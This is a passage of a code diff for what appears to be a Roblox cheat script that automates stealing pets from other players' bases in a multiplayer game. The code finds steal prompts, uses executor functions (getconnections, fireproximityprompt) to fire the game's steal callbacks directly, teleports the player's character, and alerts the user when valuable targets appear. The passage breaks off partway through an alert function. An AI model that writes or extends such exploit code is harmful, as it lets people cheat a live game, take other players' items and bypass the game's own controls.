+                    mpsLabel.Text = petData.mpsText or "$0/s"
+                    mpsLabel.Font = Enum.Font.GothamBold
+                    mpsLabel.TextSize = 10
+                    mpsLabel.TextColor3 = Theme.Accent1
+                    mpsLabel.TextXAlignment = Enum.TextXAlignment.Right
+                    petButtons[i] = {button=btn, card=cardBg, stroke=bStroke, rank=rankLabel, rankBg=rankChip, info=infoLabel, mps=mpsLabel, uid=petData.uid}
+
+                    local function onSelectTarget()
+                        selectedTargetIndex = i
+                        selectedTargetUID = petData.uid
+                        State.manualTargetEnabled = true
+                        SharedState.ListNeedsRedraw = false
+                        updateUI(autoStealEnabled, get_all_pets())
+                        if not (Config.AutoBack and _G.startAutoBack) then
+                            pcall(function()
+                                if type(_G.isInsideStealHitbox) == "function" and _G.isInsideStealHitbox() then
+                                    local ad = petData.animalData
+                                    local part = ad and findAdorneeGlobal(ad)
+                                    if part then
+                                        local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+                                        if hrp then hrp.CFrame = CFrame.new(part.Position + Vector3.new(0, 5, 0)) end
+                                    end
+                                end
+                            end)
+                        end
+                    end
+
+                    local hit = Instance.new("TextButton", btn)
+                    hit.Name = "HitArea"
+                    hit.Size = UDim2.new(1,0,1,0)
+                    hit.Position = UDim2.new(0,0,0,0)
+                    hit.BackgroundTransparency = 1
+                    hit.BorderSizePixel = 0
+                    hit.Text = ""
+                    hit.ZIndex = 20
+                    hit.AutoButtonColor = false
+                    hit.MouseButton1Click:Connect(onSelectTarget)
+                end
+            end
+            SharedState.ListNeedsRedraw = false
+        end
+        
+        if selectedTargetIndex > #petButtons then selectedTargetIndex = 1 end
+
+        for i, pb in ipairs(petButtons) do
+            local sel = (i == selectedTargetIndex)
+            local rankColor = Color3.fromRGB(90, 90, 90)
+            local rankTextColor = Color3.fromRGB(230, 230, 230)
+            if i == 1 then
+                rankColor = Color3.fromRGB(165, 165, 165)
+                rankTextColor = Color3.fromRGB(20, 20, 20)
+            elseif i == 2 then
+                rankColor = Color3.fromRGB(145, 145, 145)
+                rankTextColor = Color3.fromRGB(20, 20, 20)
+            elseif i == 3 then
+                rankColor = Color3.fromRGB(125, 125, 125)
+                rankTextColor = Color3.fromRGB(20, 20, 20)
+            end
+            pb.stroke.Transparency = sel and 0.18 or 0.55
+            if pb.card then
+                pb.card.BackgroundColor3 = sel and Color3.fromRGB(44, 44, 44) or Theme.Surface
+            end
+            pb.rankBg.BackgroundColor3 = rankColor
+            pb.rank.TextColor3  = rankTextColor
+            pb.info.TextColor3  = sel and Theme.TextPrimary or Theme.TextSecondary
+            if pb.mps then
+                pb.mps.TextColor3 = sel and Theme.Accent1 or Theme.TextSecondary
+            end
+        end
+        local ct = allPets and allPets[selectedTargetIndex]
+        local prevUID = SharedState.SelectedPetData and SharedState.SelectedPetData.uid
+        SharedState.SelectedPetData = ct
+        local newUID = ct and ct.uid
+        if Config.AutoBack and _G.startAutoBack and _G.stopAutoBack and newUID ~= prevUID then
+            pcall(function()
+                local char = LocalPlayer.Character
+                local hrp = char and char:FindFirstChild("HumanoidRootPart")
+                if hrp then
+                    local bp = hrp:FindFirstChild("TP_BodyPosition")
+                    if bp then bp:Destroy() end
+                end
+            end)
+            task.spawn(function()
+                _G.stopAutoBack()
+                task.wait(0.1)
+                _G.startAutoBack()
+            end)
+        end
+        listFrame.CanvasSize = UDim2.new(0,0,0, math.max(0, uiListLayout.AbsoluteContentSize.Y))
+    end
+    
+    uiListLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
+        listFrame.CanvasSize = UDim2.new(0,0,0, math.max(0, uiListLayout.AbsoluteContentSize.Y))
+    end)
+    
+    SharedState.UpdateAutoStealUI = function()
+        autoStealEnabled = true
+        updateUI(true, get_all_pets())
+    end
+    
+    enableBtn.MouseButton1Click:Connect(function()
+        autoStealEnabled = true
+        SharedState.ListNeedsRedraw = false
+        updateUI(true, get_all_pets())
+    end)
+    
+    nearestBtn.MouseButton1Click:Connect(function()
+        stealNearestEnabled = not stealNearestEnabled
+        if stealNearestEnabled then stealHighestEnabled = false; stealPriorityEnabled = false; State.manualTargetEnabled = false end
+        Config.StealNearest = stealNearestEnabled; Config.StealHighest = stealHighestEnabled; Config.StealPriority = stealPriorityEnabled
+        SaveConfig()
+        SharedState.ListNeedsRedraw = false; updateUI(autoStealEnabled, get_all_pets())
+    end)
+
+    highestBtn.MouseButton1Click:Connect(function()
+        stealHighestEnabled = not stealHighestEnabled
+        if stealHighestEnabled then stealNearestEnabled = false; stealPriorityEnabled = false; State.manualTargetEnabled = false end
+        Config.StealNearest = stealNearestEnabled; Config.StealHighest = stealHighestEnabled; Config.StealPriority = stealPriorityEnabled
+        SaveConfig()
+        SharedState.ListNeedsRedraw = false; updateUI(autoStealEnabled, get_all_pets())
+    end)
+
+    priorityBtn.MouseButton1Click:Connect(function()
+        stealPriorityEnabled = not stealPriorityEnabled
+        if stealPriorityEnabled then stealNearestEnabled = false; stealHighestEnabled = false; State.manualTargetEnabled = false end
+        Config.StealNearest = stealNearestEnabled; Config.StealHighest = stealHighestEnabled; Config.StealPriority = stealPriorityEnabled
+        SaveConfig()
+        SharedState.ListNeedsRedraw = false; updateUI(autoStealEnabled, get_all_pets())
+    end)
+
+    -- Expose steal mode state + toggle for the mini bar
+    SharedState.GetStealModes = function()
+        return stealNearestEnabled, stealHighestEnabled, stealPriorityEnabled
+    end
+    SharedState.SetStealMode = function(mode)
+        if mode == "nearest" then
+            stealNearestEnabled = not stealNearestEnabled
+            if stealNearestEnabled then stealHighestEnabled = false; stealPriorityEnabled = false; State.manualTargetEnabled = false end
+        elseif mode == "highest" then
+            stealHighestEnabled = not stealHighestEnabled
+            if stealHighestEnabled then stealNearestEnabled = false; stealPriorityEnabled = false; State.manualTargetEnabled = false end
+        elseif mode == "priority" then
+            stealPriorityEnabled = not stealPriorityEnabled
+            if stealPriorityEnabled then stealNearestEnabled = false; stealHighestEnabled = false; State.manualTargetEnabled = false end
+        end
+        Config.StealNearest = stealNearestEnabled; Config.StealHighest = stealHighestEnabled; Config.StealPriority = stealPriorityEnabled
+        SaveConfig()
+        SharedState.ListNeedsRedraw = false
+        updateUI(autoStealEnabled, get_all_pets())
+        if SharedState._refreshMiniModeBar then pcall(SharedState._refreshMiniModeBar) end
+    end
+
+    -- ── Mini mode bar (parented to screenGui to bypass frame.ClipsDescendants) ──
+    local miniBar = Instance.new("Frame", screenGui)
+    miniBar.Name = "MiniModeBar"
+    miniBar.Size = UDim2.new(0, 276, 0, 30)
+    miniBar.BackgroundColor3 = Theme.Surface
+    miniBar.BackgroundTransparency = 0.08
+    miniBar.BorderSizePixel = 0
+    Instance.new("UICorner", miniBar).CornerRadius = UDim.new(0, 8)
+    local miniBarStroke = Instance.new("UIStroke", miniBar)
+    miniBarStroke.Color = Theme.Accent2; miniBarStroke.Thickness = 1.2; miniBarStroke.Transparency = 0.4
+
+    local miniLayout = Instance.new("UIListLayout", miniBar)
+    miniLayout.FillDirection = Enum.FillDirection.Horizontal
+    miniLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+    miniLayout.VerticalAlignment = Enum.VerticalAlignment.Center
+    miniLayout.Padding = UDim.new(0, 4)
+    local miniPad = Instance.new("UIPadding", miniBar)
+    miniPad.PaddingLeft = UDim.new(0, 6); miniPad.PaddingRight = UDim.new(0, 6)
+
+    -- Position the bar just below the autosteal frame and keep it in sync as frame moves
+    local function syncMiniBarPos()
+        local ap = frame.AbsolutePosition
+        local as = frame.AbsoluteSize
+        miniBar.Position = UDim2.new(0, ap.X, 0, ap.Y + as.Y + 4)
+    end
+    -- Wait one frame for AbsolutePosition to be valid
+    task.defer(syncMiniBarPos)
+    frame:GetPropertyChangedSignal("AbsolutePosition"):Connect(syncMiniBarPos)
+    frame:GetPropertyChangedSignal("AbsoluteSize"):Connect(syncMiniBarPos)
+    frame:GetPropertyChangedSignal("Visible"):Connect(function() miniBar.Visible = frame.Visible end)
+
+    local function makeMiniBtn(label)
+        local b = Instance.new("TextButton", miniBar)
+        b.Size = UDim2.new(0, 82, 0, 22)
+        b.AutoButtonColor = false
+        b.Text = label; b.Font = Enum.Font.GothamBold; b.TextSize = 10
+        b.BorderSizePixel = 0
+        b.BackgroundColor3 = Theme.SurfaceHighlight; b.TextColor3 = Theme.TextPrimary
+        Instance.new("UICorner", b).CornerRadius = UDim.new(0, 6)
+        local s = Instance.new("UIStroke", b); s.Thickness = 1.2; s.Transparency = 0.5; s.Color = Theme.Accent2
+        b.MouseEnter:Connect(function() if b.BackgroundColor3 ~= Theme.Accent1 then b.BackgroundTransparency = 0.15 end end)
+        b.MouseLeave:Connect(function() b.BackgroundTransparency = 0 end)
+        return b, s
+    end
+
+    local miniNearest, miniNearestStroke = makeMiniBtn("NEAREST")
+    local miniHighest, miniHighestStroke = makeMiniBtn("HIGHEST")
+    local miniPriority, miniPriorityStroke = makeMiniBtn("PRIORITY")
+
+    local function refreshMiniBar()
+        local n, h, p = SharedState.GetStealModes()
+        miniNearest.BackgroundColor3 = n and Theme.Accent1 or Theme.SurfaceHighlight
+        miniNearest.TextColor3 = n and Color3.new(0,0,0) or Theme.TextPrimary
+        miniNearestStroke.Color = n and Theme.Accent1 or Theme.Accent2
+        miniHighest.BackgroundColor3 = h and Theme.Accent1 or Theme.SurfaceHighlight
+        miniHighest.TextColor3 = h and Color3.new(0,0,0) or Theme.TextPrimary
+        miniHighestStroke.Color = h and Theme.Accent1 or Theme.Accent2
+        miniPriority.BackgroundColor3 = p and Theme.Accent1 or Theme.SurfaceHighlight
+        miniPriority.TextColor3 = p and Color3.new(0,0,0) or Theme.TextPrimary
+        miniPriorityStroke.Color = p and Theme.Accent1 or Theme.Accent2
+    end
+    SharedState._refreshMiniModeBar = refreshMiniBar
+    refreshMiniBar()
+
+    miniNearest.MouseButton1Click:Connect(function() SharedState.SetStealMode("nearest") end)
+    miniHighest.MouseButton1Click:Connect(function() SharedState.SetStealMode("highest") end)
+    miniPriority.MouseButton1Click:Connect(function() SharedState.SetStealMode("priority") end)
+    -- ── End mini mode bar ──
+
+    local customizePriorityBtn = Instance.new("TextButton", toggleBtnContainer)
+    customizePriorityBtn.Size = UDim2.new(1,0,0,24); customizePriorityBtn.Position = UDim2.new(0,0,0,92)
+    customizePriorityBtn.BackgroundColor3 = Theme.Accent2
+    customizePriorityBtn.Text = "CUSTOMIZE PRIORITY"; customizePriorityBtn.Font = Enum.Font.GothamBold
+    customizePriorityBtn.TextSize = 10; customizePriorityBtn.TextColor3 = Color3.new(1,1,1)
+    Instance.new("UICorner", customizePriorityBtn).CornerRadius = UDim.new(0, 6)
+    customizePriorityBtn.Visible = true
+    
+    customizePriorityBtn.MouseButton1Click:Connect(function()
+        local priorityGui = PlayerGui:FindFirstChild("PriorityListGUI")
+        if priorityGui then
+            priorityGui.Enabled = not priorityGui.Enabled
+            if priorityGui.Enabled and SharedState.RefreshPriorityGUI then SharedState.RefreshPriorityGUI() end
+        end
+    end)
+
+    local instantStealBtn = Instance.new("TextButton", toggleBtnContainer)
+    instantStealBtn.Size = UDim2.new(1,0,0,24*uiScale); instantStealBtn.Position = UDim2.new(0,0,0,116*uiScale)
+    instantStealBtn.BackgroundColor3 = instantStealEnabled and Theme.Accent1 or Theme.SurfaceHighlight
+    instantStealBtn.Text = instantStealEnabled and "INSTANT STEAL: ON" or "INSTANT STEAL: OFF"; instantStealBtn.Font = Enum.Font.GothamBold
+    instantStealBtn.TextSize = 10*uiScale; instantStealBtn.TextColor3 = instantStealEnabled and Color3.new(0,0,0) or Theme.TextPrimary
+    Instance.new("UICorner", instantStealBtn).CornerRadius = UDim.new(0, 6)
+
+    instantStealBtn.MouseButton1Click:Connect(function()
+        instantStealEnabled = not instantStealEnabled
+        if not instantStealEnabled then
+            instantStealReady = false
+            instantStealDidInit = false
+        end
+        Config.InstantSteal = instantStealEnabled
+        SaveConfig()
+        instantStealBtn.Text = instantStealEnabled and "INSTANT STEAL: ON" or "INSTANT STEAL: OFF"
+        instantStealBtn.BackgroundColor3 = instantStealEnabled and Theme.Accent1 or Theme.SurfaceHighlight
+        instantStealBtn.TextColor3 = instantStealEnabled and Color3.new(0,0,0) or Theme.TextPrimary
+        SharedState.ListNeedsRedraw = false; updateUI(autoStealEnabled, get_all_pets())
+    end)
+
+    local function findProximityPromptForAnimal(animalData)
+        if not animalData then return nil end
+        local cp = PromptMemoryCache[animalData.uid]
+        if cp and cp.Parent then return cp end
+        local plot = Workspace.Plots:FindFirstChild(animalData.plot); if not plot then return nil end
+        local podiums = plot:FindFirstChild("AnimalPodiums"); if not podiums then return nil end
+        
+        
+        local ch = Synchronizer:Get(plot.Name)
+        if not ch then
+            
+            local podium = podiums:FindFirstChild(animalData.slot)
+            if podium then
+                local base = podium:FindFirstChild("Base")
+                local spawn = base and base:FindFirstChild("Spawn")
+                if spawn then
+                    local attach = spawn:FindFirstChild("PromptAttachment")
+                    if attach then
+                        for _, p in ipairs(attach:GetChildren()) do
+                            if p:IsA("ProximityPrompt") then
+                                PromptMemoryCache[animalData.uid] = p
+                                return p
+                            end
+                        end
+                    end
+                end
+            end
+            return nil
+        end
+        
+        local al = ch:Get("AnimalList")
+        if not al then return nil end
+        
+        local brainrotName = animalData.name and animalData.name:lower() or ""
+        local targetSlot = animalData.slot
+        
+        
+        local foundPodium = nil
+        for slot, ad in pairs(al) do
+            if type(ad) == "table" and tostring(slot) == targetSlot then
+                local aName, aInfo = ad.Index, AnimalsData[ad.Index]
+                if aInfo and (aInfo.DisplayName or aName):lower() == brainrotName then
+                    foundPodium = podiums:FindFirstChild(tostring(slot))
+                    break
+                end
+            end
+        end
+        
+        
+        if not foundPodium then
+            foundPodium = podiums:FindFirstChild(animalData.slot)
+        end
+        
+        if foundPodium then
+            local base = foundPodium:FindFirstChild("Base")
+            local spawn = base and base:FindFirstChild("Spawn")
+            if spawn then
+                
+                local attach = spawn:FindFirstChild("PromptAttachment")
+                if attach then
+                    for _, p in ipairs(attach:GetChildren()) do
+                        if p:IsA("ProximityPrompt") and p.Enabled and p.ActionText == "Steal" then
+                            PromptMemoryCache[animalData.uid] = p
+                            return p
+                        end
+                    end
+                end
+                
+                
+                local startPos = spawn.Position
+                local slotX, slotZ = startPos.X, startPos.Z
+                local nearestPrompt = nil
+                local minDist = math.huge
+                
+                for _, desc in pairs(plot:GetDescendants()) do
+                    if desc:IsA("ProximityPrompt") and desc.Enabled and desc.ActionText == "Steal" then
+                        local part = desc.Parent
+                        local promptPos = nil
+                        
+                        if part and part:IsA("BasePart") then
+                            promptPos = part.Position
+                        elseif part and part:IsA("Attachment") and part.Parent and part.Parent:IsA("BasePart") then
+                            promptPos = part.Parent.Position
+                        end
+                        
+                        if promptPos then
+                            local checkStartY = startPos.Y
+                            if brainrotName:find("la secret combinasion") then
+                                checkStartY = startPos.Y - 5
+                            end
+                            local horizontalDist = math.sqrt((promptPos.X - slotX)^2 + (promptPos.Z - slotZ)^2)
+                            if horizontalDist < 5 and promptPos.Y > checkStartY then
+                                local yDist = promptPos.Y - checkStartY
+                                if yDist < minDist then
+                                    minDist = yDist
+                                    nearestPrompt = desc
+                                end
+                            end
+                        end
+                    end
+                end
+                
+                if nearestPrompt then
+                    PromptMemoryCache[animalData.uid] = nearestPrompt
+                    return nearestPrompt
+                end
+            end
+        end
+        
+        return nil
+    end
+
+    local STEAL_DURATION = 0.8
+
+    local function buildStealCallbacks(prompt)
+        if InternalStealCache[prompt] then return end
+        local data = {holdCallbacks = {}, triggerCallbacks = {}, holdEndCallbacks = {}, ready = true}
+        local ok1, conns1 = pcall(getconnections, prompt.PromptButtonHoldBegan)
+        if ok1 and type(conns1) == "table" then
+            for _, conn in ipairs(conns1) do
+                if type(conn.Function) == "function" then
+                    table.insert(data.holdCallbacks, conn.Function)
+                end
+            end
+        end
+        local ok2, conns2 = pcall(getconnections, prompt.Triggered)
+        if ok2 and type(conns2) == "table" then
+            for _, conn in ipairs(conns2) do
+                if type(conn.Function) == "function" then
+                    table.insert(data.triggerCallbacks, conn.Function)
+                end
+            end
+        end
+        local ok3, conns3 = pcall(getconnections, prompt.PromptButtonHoldEnded)
+        if ok3 and type(conns3) == "table" then
+            for _, conn in ipairs(conns3) do
+                if type(conn.Function) == "function" then
+                    table.insert(data.holdEndCallbacks, conn.Function)
+                end
+            end
+        end
+        if (#data.holdCallbacks > 0) or (#data.triggerCallbacks > 0) or (#data.holdEndCallbacks > 0) then
+            InternalStealCache[prompt] = data
+        end
+    end
+
+    local function runCallbackList(list)
+        for _, fn in ipairs(list) do
+            task.spawn(fn)
+        end
+    end
+
+    local INSTANT_STEAL_RADIUS = 60
+    local INSTANT_STEAL_COOLDOWN = 0.04
+    local lastInstantStealTime = 0
+    local function isMyPlot_Instant(plotName)
+        local plots = workspace:FindFirstChild("Plots")
+        if not plots then return false end
+        local plot = plots:FindFirstChild(plotName)
+        if not plot then return false end
+        local sign = plot:FindFirstChild("PlotSign")
+        if not sign then return false end
+        local yb = sign:FindFirstChild("YourBase")
+        return yb and yb:IsA("BillboardGui") and yb.Enabled
+    end
+    local function findNearestPrompt_Instant()
+        local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+        if not hrp then return nil, math.huge, nil end
+        local plots = workspace:FindFirstChild("Plots")
+        if not plots then return nil, math.huge, nil end
+        local bestPrompt, bestDist, bestName = nil, math.huge, nil
+        for _, plot in ipairs(plots:GetChildren()) do
+            if isMyPlot_Instant(plot.Name) then continue end
+            local plotDist = math.huge
+            pcall(function() plotDist = (plot:GetPivot().Position - hrp.Position).Magnitude end)
+            if plotDist > INSTANT_STEAL_RADIUS + 40 then continue end
+            local podiums = plot:FindFirstChild("AnimalPodiums")
+            if not podiums then continue end
+            for _, pod in ipairs(podiums:GetChildren()) do
+                local base = pod:FindFirstChild("Base")
+                local spawn = base and base:FindFirstChild("Spawn")
+                if not spawn then continue end
+                local dist = (spawn.Position - hrp.Position).Magnitude
+                if dist > INSTANT_STEAL_RADIUS or dist >= bestDist then continue end
+                local att = spawn:FindFirstChild("PromptAttachment")
+                if not att then continue end
+                local prompt = att:FindFirstChildOfClass("ProximityPrompt")
+                if prompt and prompt.Parent and prompt.Enabled then
+                    bestPrompt = prompt
+                    bestDist = dist
+                    bestName = pod.Name
+                end
+            end
+        end
+        return bestPrompt, bestDist, bestName
+    end
+    -- STEAL: fireproximityprompt + direct remote callbacks
+    local function executeInstantSteal(prompt)
+        if not prompt or not prompt.Parent or not prompt.Enabled then return end
+        local now = os.clock()
+        if now - lastInstantStealTime < INSTANT_STEAL_COOLDOWN then return end
+        lastInstantStealTime = now
+
+        -- Fire the proximity prompt (mimics real E press)
+        pcall(function()
+            if fireproximityprompt then
+                fireproximityprompt(prompt)
+            end
+        end)
+
+        -- Also fire server remote directly via getconnections callbacks
+        task.spawn(function()
+            buildStealCallbacks(prompt)
+            local data = InternalStealCache[prompt]
+            if data then
+                if #data.holdCallbacks > 0 then
+                    runCallbackList(data.holdCallbacks)
+                end
+                task.wait(0.05)
+                if #data.triggerCallbacks > 0 then
+                    runCallbackList(data.triggerCallbacks)
+                end
+            end
+        end)
+    end
+
+    local function executeInternalStealAsync(prompt, animalUID)
+        local data = InternalStealCache[prompt]
+        if not data or not data.ready then return false end
+        data.ready = false
+
+        task.spawn(function()
+            if currentStealTargetUID ~= animalUID then
+                if activeProgressTween then activeProgressTween:Cancel() end
+                resetProgressVisual()
+                currentStealTargetUID = animalUID
+            end
+
+            -- Hold begin
+            if #data.holdCallbacks > 0 then
+                runCallbackList(data.holdCallbacks)
+            end
+
+            resetProgressVisual()
+            runProgressTimer()
+
+            if currentStealTargetUID == animalUID and #data.triggerCallbacks > 0 then
+                runCallbackList(data.triggerCallbacks)
+            end
+
+            data.ready = true
+        end)
+
+        return true
+    end
+
+    local function attemptSteal(prompt, animalUID)
+        if not prompt or not prompt.Parent then return false end
+        buildStealCallbacks(prompt)
+        if not InternalStealCache[prompt] then return false end
+
+        if currentStealTargetUID ~= animalUID then
+            if activeProgressTween then
+                activeProgressTween:Cancel()
+                activeProgressTween = nil
+            end
+            resetProgressVisual()
+        end
+
+        return executeInternalStealAsync(prompt, animalUID)
+    end
+
+    local function prebuildStealCallbacks()
+        for _, prompt in pairs(PromptMemoryCache) do
+            if prompt and prompt.Parent then
+                buildStealCallbacks(prompt)
+            end
+        end
+    end
+
+    task.spawn(function()
+        while task.wait(2) do
+            if autoStealEnabled then
+                prebuildStealCallbacks()
+            end
+        end
+    end)
+
+    local lastAnimalData = {}
+    local function getAnimalHash(al)
+        if not al then return "" end; local h=""
+        for slot, d in pairs(al) do if type(d)=="table" then h=h..tostring(slot)..tostring(d.Index)..tostring(d.Mutation) end end
+        return h
+    end
+
+    local function scanSinglePlot(plot)
+        local changed = false
+        pcall(function()
+            local ch = Synchronizer:Get(plot.Name); if not ch then return end
+            local al = ch:Get("AnimalList")
+            local hash = getAnimalHash(al)
+            if lastAnimalData[plot.Name]==hash then return end
+            lastAnimalData[plot.Name]=hash; changed=true
+            for i=#allAnimalsCache,1,-1 do if allAnimalsCache[i].plot==plot.Name then table.remove(allAnimalsCache,i) end end
+            local owner = ch:Get("Owner")
+            if not owner or not Players:FindFirstChild(owner.Name) then return end
+            local ownerName = owner.Name or "Unknown"
+            if not al then return end
+            for slot, ad in pairs(al) do
+                if type(ad)=="table" then
+                    local aName, aInfo = ad.Index, AnimalsData[ad.Index]
+                    if aInfo then
+                        local mut = ad.Mutation or "None"
+                        if mut == "Yin Yang" then mut = "YinYang" end
+                        local traits = (ad.Traits and #ad.Traits>0) and table.concat(ad.Traits,", ") or "None"
+                        local gv = AnimalsShared:GetGeneration(aName, ad.Mutation, ad.Traits, nil)
+                        local gt = "$"..NumberUtils:ToString(gv).."/s"
+                        table.insert(allAnimalsCache, {
+                            name=aInfo.DisplayName or aName, index=aName, genText=gt, genValue=gv,
+                            mutation=mut, traits=traits, owner=ownerName,
+                            plot=plot.Name, slot=tostring(slot), uid=plot.Name.."_"..tostring(slot)
+                        })
+                    end
+                end
+            end
+        end)
+        if changed then
+            table.sort(allAnimalsCache, function(a,b) return a.genValue>b.genValue end)
+            SharedState.ListNeedsRedraw = true
+            
+            
+            if not hasShownPriorityAlert and Config.AlertsEnabled then
+                task.spawn(function()
+                    
+                    local foundPriorityPet = nil
+                    for i = 1, #PRIORITY_LIST do
+                        local priorityName = PRIORITY_LIST[i]
+                        local searchName = priorityName:lower()
+                        
+                        
+                        for _, pet in ipairs(allAnimalsCache) do
+                            if pet.name and pet.name:lower() == searchName then
+                                foundPriorityPet = pet
+                                break
+                            end
+                        end
+                        
+                        
+                        if foundPriorityPet then
+                            break
+                        end
+                    end
+                    
+                    if foundPriorityPet then
+                        
+                        local ownerUsername = foundPriorityPet.owner
+                        local ownerPlayer = nil
+                        
+                        local plot = Workspace:FindFirstChild("Plots") and Workspace.Plots:FindFirstChild(foundPriorityPet.plot)
+                        if plot then
+                            
+                            local sync = Synchronizer
+                            if not sync then
+                                local Packages = ReplicatedStorage:FindFirstChild("Packages")
+                                if Packages then
+                                    local ok, syncModule = pcall(function() return require(Packages:WaitForChild("Synchronizer")) end)
+                                    if ok then sync = syncModule end
+                                end
+                            end
+                            
+                            if sync then
+                                local ok, ch = pcall(function() return sync:Get(plot.Name) end)
+                                if ok and ch then
+                                    local owner = ch:Get("Owner")
+                                    if owner then
+                                        if typeof(owner) == "Instance" and owner:IsA("Player") then
+                                            ownerPlayer = owner
+                                            ownerUsername = owner.Name
+                                        elseif type(owner) == "table" and owner.Name then
+                                            ownerUsername = owner.Name
+                                            ownerPlayer = Players:FindFirstChild(owner.Name)
+                                        end
+                                    end
+                                end
+                            end
+                        end
+                        
+                        
+                        if not ownerPlayer and ownerUsername then
+                            ownerPlayer = Players:FindFirstChild(ownerUsername)
+                        end
+                        
+                        ShowPriorityAlert(foundPriorityPet.name, foundPriorityPet.genText, foundPriorityPet.mutation, ownerUsername)
+                    end
+                end)
+            end
+        end
+    end
+
+    local function setupPlotListener(plot)
+        local ch, retries = nil, 0
+        while not ch and retries<50 do
+            local ok, r = pcall(function() return Synchronizer:Get(plot.Name) end)
+            if ok and r then ch=r; break else retries=retries+1; task.wait(0.1) end
+        end
+        if not ch then return end
+        scanSinglePlot(plot)
+        plot.DescendantAdded:Connect(function() task.wait(0.1); scanSinglePlot(plot) end)
+        plot.DescendantRemoving:Connect(function() task.wait(0.1); scanSinglePlot(plot) end)
+        task.spawn(function() while plot.Parent do task.wait(5); scanSinglePlot(plot) end end)
+    end
+
+    local plots = Workspace:WaitForChild("Plots", 8)
+    if plots then
+        for _, p in ipairs(plots:GetChildren()) do setupPlotListener(p) end
+        plots.ChildAdded:Connect(function(p) task.wait(0.5); setupPlotListener(p) end)
+        plots.ChildRemoved:Connect(function(p)
+            lastAnimalData[p.Name]=nil
+            for i=#allAnimalsCache,1,-1 do if allAnimalsCache[i].plot==p.Name then table.remove(allAnimalsCache,i) end end
+            SharedState.ListNeedsRedraw=true
+        end)
+    end
+    
+    local hasShownPriorityAlert = false
+    
+    ShowPriorityAlert = function(brainrotName, genText, mutation, ownerUsername)
+        if not Config.AlertsEnabled then return end
+        if hasShownPriorityAlert then return end
+        
+        local ownerPlayer = ownerUsername and Players:FindFirstChild(ownerUsername) or nil
+        local isInDuel = ownerPlayer and ownerPlayer:GetAttribute("__duels_block_steal") == true or false
+        local duelStatusText = isInDuel and "IN DUEL" or "NOT IN DUEL"
+        local duelStatusColor = isInDuel and Color3.fromRGB(255, 0, 0) or Color3.fromRGB(0, 255, 0)
+        
+        local mutationColors = {
+            ["rainbow"] = Color3.fromRGB(170, 170, 170),
+            ["bloodrot"] = Color3.fromRGB(120, 120, 120),
+            ["candy"] = Color3.fromRGB(185, 185, 185),
+            ["radioactive"] = Color3.fromRGB(160, 160, 160),
+            ["cursed"] = Color3.fromRGB(130, 130, 130),
+            ["gold"] = Color3.fromRGB(190, 190, 190),
+            ["diamond"] = Color3.fromRGB(210, 210, 210),
+            ["yinyang"] = Color3.fromRGB(230, 230, 230),
+            ["lava"] = Color3.fromRGB(140, 140, 140)
+        }
+        
+        local normalizedMutation = mutation and mutation:gsub("%s+", ""):lower() or ""
+        local color = mutationColors[normalizedMutation] or Color3.fromRGB(170, 170, 170)
+        
+        local existing = PlayerGui:FindFirstChild("BullysPriorityAlert")
+        if existing then existing:Destroy() end
+        
+        local alertGui = Instance.new("ScreenGui")
+        alertGui.Name = "BullysPriorityAlert"
+        alertGui.ResetOnSpawn = false
+        alertGui.DisplayOrder = 999
+        alertGui.Parent = PlayerGui
+        
+        hasShownPriorityAlert = true
+        
+        local alertFrame = Instance.new("Frame")
+        alertFrame.Size = UDim2.new(0, 400, 0, 60)
+        alertFrame.Position = UDim2.new(0.5, 0, 0, -70)
+        alertFrame.AnchorPoint = Vector2.new(0.5, 0)
+        alertFrame.BackgroundColor3 = Color3.fromRGB(12, 14, 20)
+        alertFrame.BackgroundTransparency = 0.05
+        alertFrame.BorderSizePixel = 0
+        alertFrame.Parent = alertGui
+        
+        Instance.new("UICorner", alertFrame).CornerRadius = UDim.new(0, 12)
+        
+        local glowStroke = Instance.new("UIStroke", alertFrame)
+        glowStroke.Name = "GlowStroke"
+        glowStroke.Thickness = 3
+        glowStroke.Color = color
+        glowStroke.Transparency = 1
+        
+        local innerGlow = Instance.new("Frame", alertFrame)
+        innerGlow.Name = "InnerGlow"
+        innerGlow.Size = UDim2.new(1, 6, 1, 6)
+        innerGlow.Position = UDim2.new(0.5, 0, 0.5, 0)
+        innerGlow.AnchorPoint = Vector2.new(0.5, 0.5)
+        innerGlow.BackgroundColor3 = color
+        innerGlow.BackgroundTransparency = 1
+        innerGlow.ZIndex = 0
+        Instance.new("UICorner", innerGlow).CornerRadius = UDim.new(0, 14)
+        
+        local accentBar = Instance.new("Frame", alertFrame)
+        accentBar.Size = UDim2.new(0, 4, 1, -12)
+        accentBar.Position = UDim2.new(0, 8, 0, 6)
+        accentBar.BackgroundColor3 = color
+        accentBar.BorderSizePixel = 0
+        Instance.new("UICorner", accentBar).CornerRadius = UDim.new(0, 2)
+        
+        local nameLabel = Instance.new("TextLabel", alertFrame)
+        nameLabel.Size = UDim2.new(1, -30, 0.55, 0)
+        nameLabel.Position = UDim2.new(0, 20, 0, 6)
+        nameLabel.BackgroundTransparency = 1
+        nameLabel.Text = brainrotName .. " - " .. genText
+        nameLabel.Font = Enum.Font.GothamBlack
+        nameLabel.TextSize = 18
+        nameLabel.TextColor3 = color
+        nameLabel.TextXAlignment = Enum.TextXAlignment.Center
+        nameLabel.TextStrokeTransparency = 0
+        nameLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+        
+        local genLabel = Instance.new("TextLabel", alertFrame)
+        genLabel.Size = UDim2.new(1, -30, 0.4, 0)
+        genLabel.Position = UDim2.new(0, 20, 0.55, 0)
+        genLabel.BackgroundTransparency = 1
+        genLabel.Text = duelStatusText
+        genLabel.Font = Enum.Font.GothamBold
+        genLabel.TextSize = 17
+        genLabel.TextColor3 = duelStatusColor
+        genLabel.TextXAlignment = Enum.TextXAlignment.Center
+        genLabel.TextStrokeColor3 = color
+        
+        TweenService:Create(alertFrame, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+            Position = UDim2.new(0.5, 0, 0, 15)
+        }):Play()
+        
+        if Config.AlertSoundID and Config.AlertSoundID ~= "" then
+            local sound = Instance.new("Sound")
+            sound.SoundId = Config.AlertSoundID
+            sound.Volume = 0.5
+            sound.Parent = alertFrame
+            sound:Play()
+            
